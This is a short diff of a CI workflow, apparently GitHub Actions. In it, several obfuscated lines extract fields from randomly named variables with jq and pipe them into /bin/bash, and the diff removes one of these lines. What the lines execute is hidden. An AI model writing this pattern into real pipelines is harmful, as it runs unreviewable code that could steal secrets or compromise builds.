@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$mml530" | jq -r .qj4712 | /bin/bash
           echo $t2179 | jq -r .ailsx819 | /bin/bash
           echo $uz014 | jq -r .lojbq25096 | /bin/bash
-          echo $u819 | jq -r .gvluw3538 | /bin/bash
           echo $ck5469 | jq -r .czslf66 | /bin/bash
 
       - name: Upload data
